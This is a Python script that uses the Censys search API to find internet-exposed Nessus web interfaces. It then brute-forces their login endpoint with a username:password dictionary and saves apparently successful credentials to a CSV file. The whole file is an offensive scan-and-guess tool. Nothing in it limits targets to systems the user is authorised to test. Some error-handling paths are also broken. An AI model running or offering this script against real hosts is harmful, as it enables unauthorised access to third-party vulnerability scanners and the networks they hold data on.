import argparse, requests, re, csv

def nessus_censys_search(uid, secret, unames, passwds, port):
    def get_page(next):
        ips = []
        if next == None: 
            res = requests.get("https://search.censys.io/api/v2/hosts/search?q=NessusWWW&per_page=100", auth=(uid, secret))
        else: 
            res = requests.get("https://search.censys.io/api/v2/hosts/search?q=NessusWWW&per_page=100&cursor="+next, auth=(uid, secret))
        if res.status_code != 200:
            print("error occurred: %s" % res.json()["error"])
            return ips
        values = res.json()["result"]["hits"]
        next = res.json()["result"]["links"]["next"]
        for x in range(0, len(values)):
            ips.append(values[x]["ip"])
        return ips, next

    def brute(ips):
        def make_req(hst, prt, usr, pss):
                headers = {"Host":hst+":"+prt, "Content-Length":"46", "X-Api-Token":"25AF139E-4DE2-4969-A5CA-8F38D9BDC98C"}
                try: 
                    r = requests.post("https://" + hst + ":" + prt + "/session", headers=headers, data={"username":usr,"password":pss}, verify=False, timeout=10)
                except: 
                    return -1, -1, -1, -1
                try: 
                    decodedContent = (r.content).decode()
                    if not "error" in decodedContent: 
                        return hst, prt, usr, pss
                    else: 
                        return hst, prt, "", ""
                except:
                    print("Potential issue on host: " + hst)
        results = []
        for ip in ips:
            for x in range(0, len(unames)):
                h, _, u, p = make_req(ip, port, unames[x], passwds[x])
                results.append((h, u, p))
        return results

    total = []
    ips, nextPage = get_page(None)
    total.append(ips) 
    counter = 0
    while nextPage != '' and counter < 50:
        counter+=1
        ips, nextPage = get_page(nextPage)
        total.append(ips)
    
    flat_iplist = [item for sublist in total for item in sublist]
    return brute(flat_iplist) 

if __name__=="__main__":
    PORT, UID, SECRET = "", "", ""
    usernames, passwords = [], []

    parser = argparse.ArgumentParser()
    parser.add_argument("--auth", help="Censys Auth -- (UID, SECRET)")
    parser.add_argument("-p", "--port", help="Port to use for nessus web page")
    parser.add_argument("-d", "--dict", help="Dictonary for nessus auth testing")
    parser.add_argument("-o", "--outfile", help="Output file to dump results to")
    parser.add_argument("-v", "--verbose", help="include failed results", action='store_true')
    args = parser.parse_args()
    
    if(args.port): PORT=args.port
    else: PORT = "8834"
    
    if (args.auth is not None) and (args.dict is not None): 
        with open(args.dict, 'r') as f:
            userpass = f.readlines()
        for up in userpass:
            usernames.append(up.split(':')[0])
            passwords.append(up.split(':')[1])
        secret_rex = r'\((?P<uid>[^,]*),(| )(?P<secret>[^\^ )]*)\)'
        secrets = re.match(secret_rex, args.auth)
        if secrets is None: 
            print("Error - Auth string not in correct format (UID, SECRET)")
            quit()
        else:
            UID, SECRET = secrets['uid'], secrets['secret']
    
    all_res = nessus_censys_search(UID, SECRET, usernames, passwords, PORT)
    if(args.outfile is not None):
        with open(args.outfile, 'w', newline='') as f:
            csv_out=csv.writer(f)
            csv_out.writerow(['Host','User', 'Password'])
            for row in all_res:
                if row[0] == -1:
                    continue
                if (row[1] == "" and (args.verbose is None)):
                    continue
                else:
                    csv_out.writerow(row)
    else:
        print(all_res)
    